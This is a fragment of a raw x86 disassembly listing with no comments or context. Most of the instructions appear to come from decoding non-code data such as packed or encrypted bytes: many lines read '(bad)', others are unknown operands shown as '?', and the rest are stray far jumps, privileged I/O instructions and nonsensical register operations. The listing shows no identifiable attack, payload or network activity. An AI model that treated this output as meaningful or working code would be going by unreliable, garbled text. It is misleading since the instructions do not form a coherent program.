  40d4f6:	imul   eax,DWORD PTR [edx+0x1f],0x43
  40d4fa:	jns    0x40d53b
  40d4fc:	outs   dx,BYTE PTR ds:[esi]
  40d4fd:	icebp  
  40d4fe:	sbb    DWORD PTR [ebx+ebp*2+0x10],0x2f9f99c8
  40d506:	sbb    BYTE PTR [ecx-0x5ebff803],cl
  40d50c:	mov    al,ds:0xc033a5d1
  40d511:	sbb    eax,0x81471458
  40d516:	dec    ebp
  40d517:	adc    BYTE PTR [ecx],dl
  40d519:	push   edi
  40d51a:	or     eax,ebx
  40d51c:	push   eax
  40d51d:	xlat   BYTE PTR ds:[ebx]
  40d51e:	idiv   BYTE PTR [edx]
  40d520:	call   0xd28fce25
  40d525:	sbb    eax,0xcc5fb1c2
  40d52a:	and    al,0xcc
  40d52c:	fnstsw WORD PTR [edi-0x7a287d09]
  40d532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d533:	shr    BYTE PTR [ecx+0x37],0x42
  40d537:	dec    ebx
  40d538:	pop    ss
  40d539:	pop    ebx
  40d53a:	test   al,0x23
  40d53c:	cmp    edx,DWORD PTR [ebx-0x1e]
  40d53f:	sti    
  40d540:	mov    ah,0xb3
  40d542:	cwde   
  40d543:	or     BYTE PTR [esi-0x19adbba3],0x18
  40d54a:	stos   DWORD PTR es:[di],eax
  40d54c:	mul    DWORD PTR [eax]
  40d54e:	mov    al,ds:0x4cb847ea
  40d553:	dec    ecx
  40d554:	push   ebp
  40d555:	pushf  
  40d556:	jle    0x40d5b7
  40d558:	cli    
  40d559:	retf   
  40d55a:	and    DWORD PTR [edi-0x19],esp
  40d55d:	(bad)  
  40d55e:	cmp    BYTE PTR [esi+edi*8],bl
  40d561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d562:	or     DWORD PTR [eax+0x2e],ebp
  40d565:	xchg   edx,eax
  40d566:	in     eax,dx
  40d567:	dec    esp
  40d568:	aam    0x93
  40d56a:	jmp    0x37bbe07d
  40d56f:	rcl    DWORD PTR [ecx],0x1b
  40d572:	dec    cx
  40d574:	mov    dh,0x58
  40d576:	jbe    0x40d5bc
  40d578:	(bad)  
  40d579:	mov    bl,0x31
  40d57b:	(bad)  
  40d57d:	adc    bl,BYTE PTR [eax-0x6c]
  40d580:	or     eax,0xdf6791a1
  40d585:	aad    0x4c
  40d587:	mov    ebx,0x3f97b031
  40d58c:	mov    ebx,0x1b31187d
  40d591:	jnp    0x40d599
  40d593:	les    ebp,FWORD PTR [ecx+edx*1]
  40d596:	mov    eax,0x478efa20
  40d59b:	push   esi
  40d59c:	ret    
  40d59d:	scas   al,BYTE PTR es:[edi]
  40d59e:	dec    edi
  40d59f:	cwde   
  40d5a0:	jbe    0x40d596
  40d5a2:	imul   DWORD PTR [eax+0x59128b14]
  40d5a8:	daa    
  40d5a9:	arpl   WORD PTR [edx],dx
  40d5ab:	sub    DWORD PTR [ecx],0x1d40d73c
  40d5b1:	pop    ss
  40d5b2:	daa    
  40d5b3:	xlat   BYTE PTR ds:[ebx]
  40d5b4:	into   
  40d5b5:	push   es
  40d5b6:	pop    es
  40d5b7:	arpl   WORD PTR [ebx+ebp*4+0x52699aa7],bx
  40d5be:	pop    ss
  40d5bf:	icebp  
  40d5c0:	retf   
  40d5c1:	pop    es
  40d5c2:	mov    eax,0x7cabd35e
  40d5c7:	pop    ss
  40d5c8:	add    bl,al
  40d5ca:	cwde   
  40d5cb:	push   ebp
  40d5cc:	out    dx,eax
  40d5cd:	call   0xf12294e0
  40d5d2:	popf   
  40d5d3:	adc    DWORD PTR [ebx],0x2e
  40d5d6:	stc    
  40d5d7:	(bad)  
  40d5d8:	mov    ds:0x1134576d,al
  40d5dd:	nop
  40d5de:	mov    esi,DWORD PTR [ecx]
  40d5e0:	sbb    ecx,DWORD PTR [edx+0x2d]
  40d5e3:	mov    esp,0xb9920be9
  40d5e8:	ja     0x40d64a
  40d5ea:	inc    ebp
  40d5eb:	les    edx,FWORD PTR [edx]
  40d5ed:	dec    ebp
  40d5ee:	mov    ah,0xa1
  40d5f0:	dec    esp
  40d5f1:	mov    edx,0xba467c4d
  40d5f6:	aas    
  40d5f7:	dec    esi
  40d5f8:	pop    eax
  40d5f9:	pushf  
  40d5fa:	loopne 0x40d642
  40d5fc:	adc    al,0xc0
  40d5fe:	not    bh
  40d600:	xchg   edi,eax
  40d601:	push   eax
  40d602:	mov    dl,0x5c
  40d604:	clc    
  40d605:	cwde   
  40d606:	mov    DWORD PTR [ecx+ecx*2-0x6c8e3aeb],edi
  40d60d:	ss lock mov dl,0xe9
  40d611:	or     esi,DWORD PTR [ebx+edx*1-0x6875f1d1]
  40d618:	ret    
  40d619:	aas    
  40d61a:	xor    al,0xaa
  40d61c:	push   0xffffffc9
  40d61e:	stc    
  40d61f:	call   0x749a:0x1adbd102
  40d626:	les    ebx,FWORD PTR [eax+0x38f8d11]
  40d62c:	icebp  
  40d62d:	inc    ecx
  40d62e:	inc    esi
  40d62f:	imul   edx,DWORD PTR [eax+0x1affbe17],0xffffffd8
  40d636:	adc    cl,dl
  40d638:	inc    ebp
  40d639:	loope  0x40d64d
  40d63b:	mov    ebx,ds
  40d63d:	sub    dh,dh
  40d63f:	push   esi
  40d640:	call   0x1920:0x64e8ace8
  40d647:	stc    
  40d648:	test   al,0x3d
  40d64a:	or     ebp,DWORD PTR ds:0xb8d9faad
  40d650:	loop   0x40d6bd
  40d652:	and    eax,0xc12371db
  40d657:	loop   0x40d620
  40d659:	sbb    al,0x85
  40d65b:	hlt    
  40d65c:	cwde   
  40d65d:	rcr    DWORD PTR [edx-0x6db7a240],cl
  40d663:	loop   0x40d5eb
  40d665:	sub    DWORD PTR [esi+0x570586bb],eax
  40d66b:	push   ss
  40d66c:	sub    eax,0xd442c07a
  40d671:	jge    0x40d66e
  40d673:	add    ch,dl
  40d675:	mov    ebp,0x3b6ff291
  40d67a:	and    ah,BYTE PTR [edi]
  40d67c:	daa    
  40d67d:	int3   
  40d67e:	fscale 
  40d680:	test   eax,0x4208b9da
  40d685:	sbb    ch,BYTE PTR [edi]
  40d687:	popa   
  40d688:	pop    esp
  40d689:	jnp    0x40d65b
  40d68b:	pop    ebx
  40d68c:	pop    es
  40d68d:	dec    edi
  40d68e:	outs   dx,DWORD PTR ds:[esi]
  40d68f:	pop    ss
  40d690:	div    DWORD PTR [edi+0x3a4b2e04]
  40d696:	arpl   bp,di
  40d698:	mov    edi,DWORD PTR [ecx]
  40d69a:	jp     0x40d6ff
  40d69c:	sub    eax,0xdddcce7c
  40d6a1:	pop    eax
  40d6a2:	sub    BYTE PTR [edi+0x397f4460],0xc0
  40d6a9:	(bad)  
  40d6aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6ab:	aad    0x3e
  40d6ad:	jmp    0x7823:0xea17c90b
  40d6b4:	dec    esp
  40d6b5:	cli    
  40d6b6:	nop
  40d6b7:	sub    ah,BYTE PTR [ecx-0x48f50029]
  40d6bd:	ja     0x40d711
  40d6bf:	sbb    BYTE PTR [esi-0xa],ah
  40d6c2:	fild   DWORD PTR [ebp-0x53]
  40d6c5:	mov    ah,0x2f
  40d6c7:	out    dx,eax
  40d6c8:	mov    eax,0xd866a986
  40d6cd:	ins    BYTE PTR es:[edi],dx
  40d6ce:	mov    al,ds:0xc761108d
  40d6d3:	inc    ebx
  40d6d4:	sbb    eax,0xbfb9e500
  40d6d9:	mov    bl,0x49
  40d6db:	test   BYTE PTR [esi-0x48b72379],dh
  40d6e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6e2:	push   ecx
  40d6e3:	add    DWORD PTR [ebp-0x1306ed49],0x3d2d0a48
  40d6ed:	mov    ds:0x10e52142,al
  40d6f2:	jmp    0x2e0e:0x368cba02
  40d6f9:	xor    BYTE PTR [ecx+0x3],ch
  40d6fc:	pop    ecx
  40d6fd:	out    dx,al
  40d6fe:	ja     0x40d6c8
  40d700:	retf   0x8204
  40d703:	and    eax,0xd414a76a
  40d708:	dec    esi
  40d709:	clc    
  40d70a:	ss push cs
  40d70c:	mov    ebp,0x147ef2a1
  40d711:	jg     0x40d74a
  40d713:	scas   al,BYTE PTR es:[edi]
  40d714:	jo     0x40d6c2
  40d716:	pop    esi
  40d717:	scas   al,BYTE PTR es:[edi]
  40d718:	gs js  0x40d755
  40d71b:	xchg   edx,eax
  40d71c:	inc    esi
  40d71d:	retf   0xa877
  40d720:	iret   
  40d721:	push   eax
  40d722:	lock test DWORD PTR [ebx+0x50],0x87f2c18f
  40d72a:	xor    ch,bh
  40d72c:	(bad)  
  40d72d:	cs mov ebx,0xfc48d86e
  40d733:	sub    al,bl
  40d735:	retf   
  40d736:	or     BYTE PTR [ecx+0x1d099d5c],cl
  40d73c:	(bad)  
  40d73d:	cmovnp edx,esi
  40d740:	ds adc al,0x37
  40d743:	shl    dh,0x43
  40d746:	inc    esi
  40d747:	dec    eax
  40d748:	mov    eax,0xd32b48dc
  40d74d:	sub    ch,BYTE PTR [eax]
  40d74f:	fwait
  40d750:	or     esp,DWORD PTR [eax+0x42]
  40d753:	lods   al,BYTE PTR ds:[esi]
  40d754:	and    eax,0xe4d08941
  40d759:	sbb    ebp,DWORD PTR [ebp+0x29]
  40d75c:	mov    dh,0x1c
  40d75e:	mov    dl,0x38
  40d760:	dec    edi
  40d761:	lods   eax,DWORD PTR ds:[esi]
  40d762:	(bad)
  40d765:	cdq    
  40d766:	test   DWORD PTR [eax],esi
  40d768:	fimul  WORD PTR [ecx]
  40d76a:	xor    eax,0xf9620e79
  40d76f:	fisttp QWORD PTR [edx-0x5e]
  40d772:	es pop bp
  40d775:	lea    ecx,[ebp+0x2f]
  40d778:	mov    dh,0x8c
  40d77a:	pop    ss
  40d77b:	and    BYTE PTR [ebp-0x3f0233fd],0xb
  40d782:	xchg   edx,ebx
  40d784:	and    BYTE PTR [edi+0x4cfca50],bh
  40d78a:	test   eax,0x85620d4f
  40d78f:	stc    
  40d790:	shl    ebp,cl
  40d792:	add    BYTE PTR ds:0xd209b192,0xc3
  40d799:	out    0x63,eax
  40d79b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d79c:	(bad)  
  40d79d:	std    
  40d79e:	mov    dh,0x7
  40d7a0:	int3   
  40d7a1:	xor    bl,BYTE PTR [eax-0x5a]
  40d7a4:	sub    esp,DWORD PTR [ebp+edi*1+0x5c34080e]
  40d7ab:	xchg   edx,eax
  40d7ac:	xchg   cl,cl
  40d7ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7af:	cld    
  40d7b0:	call   0xf098:0x679c40e8
  40d7b7:	mov    WORD PTR [ebx+eiz*4+0x13],?
  40d7bb:	fmul   QWORD PTR [edi]
  40d7bd:	jecxz  0x40d7c8
  40d7bf:	pop    edx
  40d7c0:	dec    esi
  40d7c1:	rol    BYTE PTR ds:0x7b50036c,cl
  40d7c7:	mov    edi,0x9a6c9c66
  40d7cc:	jo     0x40d82b
  40d7ce:	and    esi,esp
  40d7d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7d1:	xchg   edx,eax
  40d7d2:	aam    0xb6
  40d7d4:	mov    edi,0x6f7f5927
  40d7d9:	bound  esp,QWORD PTR [edx+0x7958dad8]
  40d7df:	retf   0x6969
  40d7e2:	push   eax
  40d7e3:	and    edi,DWORD PTR [edx-0x45b5f617]
  40d7e9:	ret    
  40d7ea:	mov    bh,0x3a
  40d7ec:	(bad)  
  40d7ed:	shl    BYTE PTR [edx+0x7191e976],0x72
  40d7f4:	test   al,0xff
  40d7f6:	test   bl,0x82
  40d7f9:	gs push es
  40d7fb:	add    al,0x72
  40d7fd:	int    0x42
  40d7ff:	loop   0x40d868
  40d801:	lahf   
  40d802:	in     al,dx
  40d803:	sbb    eax,edx
  40d805:	cmc    
  40d806:	aaa    
  40d807:	lods   al,BYTE PTR ds:[esi]
  40d808:	push   ss
  40d809:	push   0x2073add2
  40d80e:	cmp    dh,BYTE PTR [edx]
  40d810:	loope  0x40d865
  40d812:	or     edi,DWORD PTR [edi+eiz*4]
  40d815:	jns    0x40d810
  40d817:	sbb    cl,BYTE PTR ss:[edx-0x66]
  40d81b:	cmp    ebx,DWORD PTR [eax+0x5e]
  40d81e:	jecxz  0x40d7ad
  40d820:	or     ah,BYTE PTR [ecx-0x650f1133]
  40d826:	inc    edx
  40d827:	lea    edx,[edx-0x2fdf962b]
  40d82d:	inc    eax
  40d82e:	mov    ds:0xd6bc78c0,eax
  40d833:	shl    BYTE PTR [edx-0x31],0x7f
  40d837:	xchg   edi,eax
  40d838:	fiadd  DWORD PTR [ebp+0x7]
  40d83b:	std    
  40d83c:	mov    al,bh
  40d83e:	shl    al,cl
  40d840:	xchg   esi,eax
  40d841:	add    eax,0xc3397f0e
  40d846:	adc    eax,0x20ba132f
  40d84b:	cmp    BYTE PTR [ecx+ecx*4-0x54],ah
  40d84f:	or     DWORD PTR ds:0xa89aeb30,esi
  40d855:	imul   eax,DWORD PTR [ebx],0x68411a7d
  40d85b:	stos   DWORD PTR es:[edi],eax
  40d85c:	ret    0x9221
  40d85f:	lock pop ebp
  40d861:	or     BYTE PTR [ebx-0x5b],dl
  40d864:	and    eax,0x9ba9ab4b
  40d869:	add    al,0xa5
  40d86b:	sti    
  40d86c:	je     0x40d873
  40d86e:	shl    BYTE PTR [eax+0x1d],0x46
  40d872:	push   esi
  40d873:	fcomip st,st(1)
  40d875:	clc    
  40d876:	pop    ebx
  40d877:	xchg   esp,eax
  40d878:	inc    ebx
  40d879:	mov    cl,0xc0
  40d87b:	jo     0x40d8f6
  40d87d:	ins    BYTE PTR es:[edi],dx
  40d87e:	jge    0x40d82c
  40d880:	iret   
  40d881:	test   BYTE PTR [eax+0x4c238a78],0x83
  40d888:	hlt    
  40d889:	call   0xb0ec9a5f
  40d88e:	or     eax,0x26c9dc09
  40d893:	(bad)  [edx]
  40d895:	sahf   
  40d896:	test   eax,0x565f8069
  40d89b:	jle    0x40d824
  40d89d:	leave  
  40d89e:	mov    dl,0x5f
  40d8a0:	nop
  40d8a1:	xchg   esp,eax
  40d8a2:	pop    ds
  40d8a3:	stc    
  40d8a4:	popf   
  40d8a5:	fwait
  40d8a6:	push   0x4af310ad
  40d8ab:	imul   DWORD PTR [ecx-0x33ea7107]
  40d8b1:	jb     0x40d92b
  40d8b3:	add    eax,0x393a03a1
  40d8b8:	btr    DWORD PTR [eax+0x44],esi
  40d8bc:	shl    DWORD PTR [esi+0x4d],cl
  40d8bf:	xlat   BYTE PTR ds:[ebx]
  40d8c0:	test   eax,0x92398ef4
  40d8c5:	hlt    
  40d8c6:	aas    
  40d8c7:	xor    al,0xc4
  40d8c9:	mov    eax,0x30075b9e
  40d8ce:	bound  edi,QWORD PTR [eax+0x72bcbf12]
  40d8d4:	fld    DWORD PTR [edx-0x14]
  40d8d7:	fiadd  WORD PTR [edi-0x18bf9e71]
  40d8dd:	ds inc ebx
  40d8df:	stos   BYTE PTR es:[edi],al
  40d8e0:	mov    ch,ch
  40d8e2:	mov    dl,0x0
  40d8e4:	cmp    esi,ebp
  40d8e6:	sbb    edi,DWORD PTR es:[eax-0x45]
  40d8ea:	pop    esi
  40d8eb:	sub    al,BYTE PTR [edi-0x111b8446]
  40d8f1:	xchg   ebp,eax
  40d8f2:	stos   DWORD PTR es:[edi],eax
  40d8f3:	cld    
  40d8f4:	ror    BYTE PTR [eax-0x587a4eb4],cl
  40d8fa:	mov    edi,0x62c9c7e9
  40d8ff:	les    esp,FWORD PTR [edi-0x494d16d4]
  40d905:	mov    dl,0x5a
  40d907:	push   ds
  40d908:	or     esp,DWORD PTR [ebp-0x1ed0357a]
  40d90e:	not    DWORD PTR [ecx]
  40d910:	adc    al,0x9e
  40d912:	mov    fs,WORD PTR [ebx-0x23390b40]
  40d918:	sbb    al,cl
  40d91a:	scas   eax,DWORD PTR es:[edi]
  40d91b:	sub    eax,ebx
  40d91d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d91e:	pop    ecx
  40d91f:	cmp    eax,0x985a1549
  40d924:	cmovb  edx,DWORD PTR [edx+0x6f]
  40d928:	adc    eax,0xc091713d
  40d92d:	mov    esp,0x2037833
  40d932:	lahf   
  40d933:	mov    WORD PTR [eax-0x27],?
  40d936:	stos   DWORD PTR es:[edi],eax
  40d937:	push   cs
  40d938:	jo     0x40d93c
  40d93a:	xor    DWORD PTR [eax+0x77426b23],esp
  40d940:	mov    edi,0x36c5b565
  40d945:	mov    bh,0x2f
  40d947:	push   edi
  40d948:	mov    ebx,DWORD PTR [ebx]
  40d94a:	add    BYTE PTR [eax+ebx*2],cl
  40d94d:	sub    BYTE PTR [edx-0x61],cl
  40d950:	or     eax,0x96c89066
  40d955:	add    dh,BYTE PTR [edi+0x56b38ecd]
  40d95b:	in     al,0x32
  40d95d:	inc    ebp
  40d95e:	test   eax,0x21f2d98e
  40d963:	xlat   BYTE PTR ds:[ebx]
  40d964:	mov    ds:0x96b21b54,al
  40d969:	enter  0x28ce,0x2f
  40d96d:	and    esi,ecx
  40d96f:	xchg   ebx,eax
  40d970:	fmul   DWORD PTR [edi]
  40d972:	es pop ebp
  40d974:	test   BYTE PTR [esi+0x4f],dl
  40d977:	ret    0xd601
  40d97a:	inc    edx
  40d97b:	fxch   st(1)
  40d97d:	or     cl,ah
  40d97f:	je     0x40d9fb
  40d981:	daa    
  40d982:	cmp    ebx,DWORD PTR [eax]
  40d984:	dec    eax
  40d985:	fisubr WORD PTR [esi+0x7ebea5b2]
  40d98b:	inc    eax
  40d98c:	sbb    DWORD PTR ss:[ebp-0x6ba3e0a5],ecx
  40d993:	mov    edi,0x5fdcacc7
  40d998:	xchg   edx,eax
  40d999:	push   esp
  40d99a:	cmp    ch,cl
  40d99c:	pop    es
  40d99d:	and    al,BYTE PTR [ecx]
  40d99f:	sub    esi,DWORD PTR [ebp+0x6a]
  40d9a2:	mov    al,ds:0x165c3b6
  40d9a7:	sub    al,0x86
  40d9a9:	les    ecx,FWORD PTR [eax+0x7c95b39e]
  40d9af:	loope  0x40da19
  40d9b1:	adc    al,0x48
  40d9b3:	fdiv   st(1),st
  40d9b5:	div    ch
  40d9b7:	xor    BYTE PTR [edi],dh
  40d9b9:	mov    ecx,DWORD PTR [ecx-0x4b]
  40d9bc:	mov    al,0x23
  40d9be:	sub    al,0x6c
  40d9c0:	test   BYTE PTR [edi],bh
  40d9c2:	or     BYTE PTR [ecx-0x3a],dl
  40d9c5:	mov    dh,0xbb
  40d9c7:	pop    ebx
  40d9c8:	repnz xor eax,0x864422d1
  40d9ce:	pop    esp
  40d9cf:	scas   al,BYTE PTR es:[edi]
  40d9d0:	jl     0x40d95b
  40d9d2:	cmp    edi,DWORD PTR [ebp+0x6b]
  40d9d5:	adc    cl,BYTE PTR [edx-0x4f8ccab9]
  40d9db:	ja     0x40d9af
  40d9dd:	arpl   WORD PTR ss:[eax],cx
  40d9e0:	xor    al,bl
  40d9e2:	sub    eax,0xf9bc5659
  40d9e7:	out    dx,eax
  40d9e8:	mov    ch,0xc6
  40d9ea:	test   DWORD PTR [eax+0x1b],esi
  40d9ed:	add    DWORD PTR [edx-0xbf2982a],edi
  40d9f3:	fistp  DWORD PTR [ebp+0x3f]
  40d9f6:	loope  0x40da39
  40d9f8:	das    
  40d9f9:	test   BYTE PTR [bx],dl
  40d9fc:	ror    BYTE PTR [esi+ebx*2],0xe4
  40da00:	mov    gs:0x8af4454b,eax
  40da06:	xchg   esp,eax
  40da07:	add    eax,DWORD PTR [eax+0x45315e9e]
  40da0d:	(bad)  
  40da0e:	mov    WORD PTR [esi+esi*1],?
  40da11:	xchg   BYTE PTR [ecx],bh
  40da13:	xchg   ebx,edx
  40da15:	push   ebx
  40da16:	pop    ebx
  40da17:	mov    ebp,esi
  40da19:	xlat   BYTE PTR ds:[ebx]
  40da1a:	dec    eax
  40da1b:	sub    eax,0xa23a83ea
  40da20:	test   BYTE PTR [ebx],al
  40da22:	push   0xffffffa1
  40da24:	cld    
  40da25:	shr    BYTE PTR [esi],1
  40da27:	(bad)  
  40da28:	mov    ebx,0x8bfe0532
  40da2d:	jmp    0xe350:0x9588ac89
  40da34:	shr    DWORD PTR ds:0x79558f6,cl
  40da3a:	xchg   ebp,eax
  40da3b:	xrelease xchg BYTE PTR [edi-0x227f3c96],dl
  40da42:	in     eax,0x6f
  40da44:	mov    edx,edx
  40da46:	scas   al,BYTE PTR es:[edi]
  40da47:	sti    
  40da48:	fisub  WORD PTR [edi-0x46]
  40da4b:	mov    bl,BYTE PTR ds:0x3613ddf2
  40da51:	dec    ecx
  40da52:	dec    ecx
  40da53:	jg     0x40da6e
  40da55:	xchg   al,ch
  40da57:	jns    0x40da2b
  40da59:	arpl   WORD PTR [eax],dx
  40da5b:	loop   0x40da77
  40da5d:	add    ebx,edi
  40da5f:	out    dx,ax
  40da61:	(bad)  
  40da62:	mov    esp,0x95dc443a
  40da67:	iret   
  40da68:	loopne 0x40da2b
  40da6a:	push   cs
  40da6b:	inc    edi
  40da6c:	adc    al,0xa4
  40da6e:	xchg   DWORD PTR [esi+0x6b31aa1d],edx
  40da74:	xlat   BYTE PTR ds:[ebx]
  40da75:	imul   esp,DWORD PTR [ecx+0x37e422df],0xffffffd5
  40da7c:	mov    bh,0x3c
  40da7e:	mov    bl,0x3b
  40da80:	ret    0x60b2
  40da83:	fstp   st(6)
  40da85:	daa    
  40da86:	xor    ah,al
  40da88:	test   al,0x92
  40da8a:	jmp    0x40da17
  40da8c:	out    dx,eax
  40da8d:	out    0x66,eax
  40da8f:	and    DWORD PTR [ebp-0x1f0cac40],ecx
  40da95:	(bad)  
  40da96:	loop   0x40da4c
  40da98:	(bad)  ss:[esi+0x772cbcba]
  40da9f:	mov    dh,bh
  40daa1:	adc    eax,0xec3816e2
  40daa6:	out    0x81,al
  40daa8:	xchg   ebx,eax
  40daaa:	xchg   BYTE PTR [edx],cl
  40daac:	pop    edi
  40daad:	fbstp  TBYTE PTR [ebp+0x3e48b1f0]
  40dab3:	pop    ebx
  40dab4:	std    
  40dab5:	popf   
  40dab6:	in     al,0x70
  40dab8:	add    al,0x5a
  40daba:	pop    ss
  40dabb:	jp     0x40db29
  40dabd:	int    0x70
  40dabf:	mov    eax,0xbcd7fdea
  40dac4:	int    0x38
  40dac6:	test   DWORD PTR [edi],ebp
  40dac8:	sub    eax,esp
  40daca:	and    al,0xd2
  40dacc:	ins    DWORD PTR es:[edi],dx
  40dacd:	sbb    DWORD PTR [edx],edx
  40dacf:	adc    ebp,ecx
  40dad1:	loop   0x40db46
  40dad3:	mov    eax,0x4edbcb60
  40dad8:	(bad)  
  40dad9:	fbld   TBYTE PTR [eax]
  40dadb:	xchg   ebx,eax
  40dadc:	(bad)  
  40dadd:	mov    cl,0x16
  40dadf:	scas   eax,DWORD PTR es:[edi]
  40dae0:	add    al,0xaf
  40dae2:	pop    esi
  40dae3:	adc    BYTE PTR [esi],cl
  40dae5:	cmp    ecx,0x26fbc25
  40daeb:	shr    eax,cl
  40daed:	test   esp,ecx
  40daef:	addr16 xor edi,ecx
  40daf2:	retf   
  40daf3:	push   ebx
  40daf4:	and    BYTE PTR [eax-0x58],ah
  40daf7:	xor    BYTE PTR [esi+0x5b7f982b],cl
  40dafd:	pop    edx
  40dafe:	cmp    al,0xab
  40db00:	test   BYTE PTR [eax+0x4b676922],dh
  40db06:	inc    BYTE PTR [ebx]
  40db08:	dec    ebp
  40db09:	scas   eax,DWORD PTR es:[edi]
  40db0a:	bound  eax,QWORD PTR [ebx-0x32]
  40db0d:	(bad)  
  40db0f:	rcr    BYTE PTR [ebp+0x3a],cl
  40db12:	dec    eax
  40db13:	push   esi
  40db14:	pop    ebx
  40db15:	or     esp,DWORD PTR [ecx]
  40db17:	sar    DWORD PTR [edx-0x70],0x71
  40db1b:	jg     0x40daa9
  40db1d:	sar    BYTE PTR [edx],1
  40db1f:	mov    ecx,0xb50535b6
  40db24:	jnp    0x40db1f
  40db26:	ins    BYTE PTR es:[edi],dx
  40db27:	pop    ebp
  40db28:	shl    BYTE PTR [esi],1
  40db2a:	sub    esp,DWORD PTR [ebp+0xc]
  40db2d:	aaa    
  40db2e:	jge    0x40db6d
  40db30:	aas    
  40db31:	in     al,0xa5
  40db33:	ins    DWORD PTR es:[edi],dx
  40db34:	fs test eax,0x9f27ceb8
  40db3a:	ins    BYTE PTR es:[edi],dx
  40db3b:	enter  0x65f,0xcd
  40db3f:	sbb    al,0x7f
  40db41:	mov    ebp,0x575b476d
  40db46:	in     al,0x5
  40db48:	repz and bh,BYTE PTR [esi-0x2bc1baa]
  40db4f:	and    dh,al
  40db51:	inc    ebp
  40db52:	fwait
  40db53:	sbb    al,0xec
  40db55:	(bad)  
  40db56:	mov    dh,0x85
  40db58:	mov    ebx,0x330b2b36
  40db5d:	mov    ecx,es
  40db5f:	mov    cl,0xcd
  40db61:	or     ecx,ebx
  40db63:	addr16 test al,0x87
  40db66:	mov    al,0xf5
  40db68:	imul   edi,DWORD PTR [esi],0xffffff8c
  40db6b:	adc    esi,esp
  40db6d:	lahf   
  40db6e:	(bad)  
  40db70:	jecxz  0x40db9e
  40db72:	daa    
  40db73:	mul    BYTE PTR [edi+edi*4+0x6c]
  40db77:	add    DWORD PTR [esi-0x29940ef6],ebx
  40db7d:	in     al,0x7a
  40db7f:	mov    ecx,0x8af07d06
  40db84:	in     eax,0xc6
  40db86:	test   ebp,edx
  40db88:	dec    eax
  40db89:	mov    al,0xee
  40db8b:	or     BYTE PTR [esi],ch
  40db8d:	fxam   
  40db8f:	(bad)  
  40db90:	push   eax
  40db91:	push   ds
  40db92:	out    dx,eax
  40db93:	push   ebp
  40db94:	inc    edi
  40db95:	and    esp,DWORD PTR [ebx+0x6730d9f3]
  40db9b:	cmp    DWORD PTR [edx*2-0x4f6d0008],0xffffffe0
  40dba3:	jmp    0x8d28:0x56407c84
  40dbaa:	sbb    BYTE PTR [ebx-0x56abc123],cl
  40dbb0:	gs je  0x40dbbb
  40dbb3:	mov    ch,0xc5
  40dbb5:	std    
  40dbb6:	xor    eax,0x65e99a54
  40dbbb:	fidiv  WORD PTR [edx]
  40dbbd:	sahf   
  40dbbe:	mov    ebx,0xb27c90b6
  40dbc3:	push   edx
  40dbc4:	adc    ecx,DWORD PTR [eax]
  40dbc6:	xchg   ebp,eax
  40dbc7:	push   ecx
  40dbc8:	in     al,dx
  40dbc9:	pop    esp
  40dbca:	push   ss
  40dbcb:	test   eax,0x7aa9cd06
  40dbd0:	mov    ah,0x3e
  40dbd2:	push   ds
  40dbd3:	mov    esp,0x5c77af96
  40dbd8:	inc    edi
  40dbd9:	push   ebx
  40dbda:	mov    ebp,0x1ed45309
  40dbdf:	mov    ecx,?
  40dbe1:	mov    ecx,0x8a6a7cd
  40dbe6:	xlat   BYTE PTR ds:[ebx]
  40dbe7:	scas   al,BYTE PTR es:[edi]
  40dbe8:	(bad)  
  40dbe9:	mov    ?,WORD PTR [ebx-0x20]
  40dbec:	pop    eax
  40dbed:	ins    DWORD PTR es:[edi],dx
  40dbee:	xor    edx,edx
  40dbf0:	mov    al,fs:0x122c57f3
  40dbf6:	aaa    
  40dbf7:	test   BYTE PTR [ebx+0x23],bh
  40dbfa:	cmc    
  40dbfb:	xchg   ebx,eax
  40dbfc:	das    
  40dbfd:	mov    al,0x58
  40dbff:	in     eax,0x3d
  40dc01:	out    0xf4,eax
  40dc03:	xor    DWORD PTR [esp+ebp*2+0x6cc8bf9e],esi
  40dc0a:	aaa    
  40dc0b:	jle    0x40dc78
  40dc0d:	add    BYTE PTR [ecx-0x4f],0x5f
  40dc11:	lock in al,0x68
  40dc14:	inc    esi
  40dc15:	cmp    BYTE PTR [edi],cl
  40dc17:	add    al,BYTE PTR [esi+ecx*4-0x31]
  40dc1b:	inc    esp
  40dc1c:	xchg   edx,eax
  40dc1d:	(bad)  
  40dc1e:	enter  0xc1dc,0x5f
  40dc22:	out    0x57,al
  40dc24:	test   DWORD PTR [ecx+edx*2],0xfd19aec3
  40dc2b:	int3   
  40dc2c:	mov    eax,0x121035af
  40dc31:	out    dx,al
  40dc32:	shl    ebx,0x2
  40dc35:	test   DWORD PTR [ebx+0x7d],ebp
  40dc38:	psubusw mm6,QWORD PTR ds:0xb6d1bf2c
  40dc3f:	push   eax
  40dc40:	outs   dx,DWORD PTR ds:[esi]
  40dc41:	lds    esp,FWORD PTR [ecx]
  40dc43:	adc    DWORD PTR [edi+edi*4],ecx
  40dc46:	retf   0x5e15
  40dc49:	sub    DWORD PTR [ebp-0x3f],esp
  40dc4c:	mov    eax,0x4bfb5b02
  40dc51:	mov    bl,0x95
  40dc53:	mov    edi,0x3a0d8b0f
  40dc58:	jo     0x40dc7f
  40dc5a:	fcomi  st,st(5)
  40dc5c:	fwait
  40dc5d:	aam    0x2c
  40dc5f:	cld    
  40dc60:	cwde   
  40dc61:	add    eax,0xb1b797c3
  40dc66:	sub    BYTE PTR [edx-0x787629b0],0x67
  40dc6d:	pop    esp
  40dc6e:	ss cli 
  40dc70:	shl    DWORD PTR [esi-0x6819e6b5],0x4c
  40dc77:	sub    BYTE PTR [eax+0x1a],al
  40dc7a:	(bad)  
  40dc7b:	mov    dl,0xd8
  40dc7d:	enter  0x5f7d,0x9e
  40dc81:	mov    dl,BYTE PTR [ebx]
  40dc83:	dec    esi
  40dc84:	inc    ebp
  40dc85:	clc    
  40dc86:	add    DWORD PTR [ecx-0x7cd8345c],esp
  40dc8c:	or     al,0xbd
  40dc8e:	xchg   ebp,eax
  40dc8f:	xor    DWORD PTR [edx-0x47],0x3a
  40dc93:	ja     0x40dccc
  40dc95:	gs push ecx
  40dc97:	mov    esp,ss
